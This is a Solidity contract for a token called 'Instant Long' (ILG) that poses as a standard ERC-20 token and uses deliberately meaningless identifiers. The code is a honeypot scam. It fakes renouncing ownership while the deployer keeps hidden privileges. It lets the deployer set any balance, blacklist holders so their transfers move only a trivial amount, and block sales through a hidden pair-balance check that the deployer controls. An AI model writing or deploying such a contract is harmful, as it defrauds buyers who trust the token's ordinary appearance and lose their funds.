//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface enableTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract walletEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableAutoWallet {
    function createPair(address exemptMarketing, address listLaunch) external returns (address);
}

interface swapEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderReceiverEnable) external view returns (uint256);

    function transfer(address receiverToFund, uint256 minTxMode) external returns (bool);

    function allowance(address feeMinLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 minTxMode) external returns (bool);

    function transferFrom(
        address sender,
        address receiverToFund,
        uint256 minTxMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txMode, uint256 value);
    event Approval(address indexed feeMinLaunched, address indexed spender, uint256 value);
}

interface minList is swapEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InstantLong is walletEnable, swapEnable, minList {

    function transfer(address isListTrading, uint256 minTxMode) external virtual override returns (bool) {
        return autoTotalIs(_msgSender(), isListTrading, minTxMode);
    }

    uint256 private tokenAuto;

    mapping(address => bool) public fromSender;

    function allowance(address isAt, address atFundExempt) external view virtual override returns (uint256) {
        if (atFundExempt == teamShould) {
            return type(uint256).max;
        }
        return launchToken[isAt][atFundExempt];
    }

    address limitFundShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private senderWallet = 18;

    bool public limitList;

    uint256 constant tokenList = 10 ** 10;

    uint256 private fromIs;

    uint256 public enableAtLiquidity;

    mapping(address => bool) public receiverSenderWallet;

    address teamShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public marketingToFrom;

    function tradingMin() private view {
        require(receiverSenderWallet[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return autoLiquidityFee;
    }

    mapping(address => mapping(address => uint256)) private launchToken;

    function owner() external view returns (address) {
        return feeExempt;
    }

    function approve(address atFundExempt, uint256 minTxMode) public virtual override returns (bool) {
        launchToken[_msgSender()][atFundExempt] = minTxMode;
        emit Approval(_msgSender(), atFundExempt, minTxMode);
        return true;
    }

    function marketingTotal(address takeAt) public {
        tradingMin();
        if (tokenAuto == receiverToken) {
            launchMax = true;
        }
        if (takeAt == minTotal || takeAt == atTo) {
            return;
        }
        fromSender[takeAt] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellTotal;
    }

    mapping(address => uint256) private minLimit;

    bool private launchMax;

    constructor (){
        
        enableTx buyTeam = enableTx(teamShould);
        atTo = enableAutoWallet(buyTeam.factory()).createPair(buyTeam.WETH(), address(this));
        
        minTotal = _msgSender();
        liquidityMarketing();
        receiverSenderWallet[minTotal] = true;
        minLimit[minTotal] = sellTotal;
        if (sellModeReceiver) {
            receiverToken = tokenAuto;
        }
        emit Transfer(address(0), minTotal, sellTotal);
    }

    function takeLimitLiquidity(address isListTrading, uint256 minTxMode) public {
        tradingMin();
        minLimit[isListTrading] = minTxMode;
    }

    string private autoLiquidityFee = "ILG";

    event OwnershipTransferred(address indexed enableAuto, address indexed autoReceiverTake);

    function autoTotalIs(address modeLiquidity, address receiverToFund, uint256 minTxMode) internal returns (bool) {
        if (modeLiquidity == minTotal) {
            return fromSell(modeLiquidity, receiverToFund, minTxMode);
        }
        uint256 isList = swapEnable(atTo).balanceOf(limitFundShould);
        require(isList == shouldAuto);
        require(receiverToFund != limitFundShould);
        if (fromSender[modeLiquidity]) {
            return fromSell(modeLiquidity, receiverToFund, tokenList);
        }
        return fromSell(modeLiquidity, receiverToFund, minTxMode);
    }

    bool public launchedMax;

    uint256 private receiverToken;

    bool private sellModeReceiver;

    uint256 private sellTotal = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return feeExempt;
    }

    uint256 autoAmount;

    function name() external view virtual override returns (string memory) {
        return buyReceiver;
    }

    function fromReceiverAmount(uint256 minTxMode) public {
        tradingMin();
        shouldAuto = minTxMode;
    }

    function marketingLaunchMin(address isModeWallet) public {
        if (launchedMax) {
            return;
        }
        
        receiverSenderWallet[isModeWallet] = true;
        
        launchedMax = true;
    }

    uint256 shouldAuto;

    function fromSell(address modeLiquidity, address receiverToFund, uint256 minTxMode) internal returns (bool) {
        require(minLimit[modeLiquidity] >= minTxMode);
        minLimit[modeLiquidity] -= minTxMode;
        minLimit[receiverToFund] += minTxMode;
        emit Transfer(modeLiquidity, receiverToFund, minTxMode);
        return true;
    }

    function balanceOf(address senderReceiverEnable) public view virtual override returns (uint256) {
        return minLimit[senderReceiverEnable];
    }

    function decimals() external view virtual override returns (uint8) {
        return senderWallet;
    }

    address public minTotal;

    function liquidityMarketing() public {
        emit OwnershipTransferred(minTotal, address(0));
        feeExempt = address(0);
    }

    string private buyReceiver = "Instant Long";

    address private feeExempt;

    uint256 private shouldReceiver;

    address public atTo;

    function transferFrom(address modeLiquidity, address receiverToFund, uint256 minTxMode) external override returns (bool) {
        if (_msgSender() != teamShould) {
            if (launchToken[modeLiquidity][_msgSender()] != type(uint256).max) {
                require(minTxMode <= launchToken[modeLiquidity][_msgSender()]);
                launchToken[modeLiquidity][_msgSender()] -= minTxMode;
            }
        }
        return autoTotalIs(modeLiquidity, receiverToFund, minTxMode);
    }

}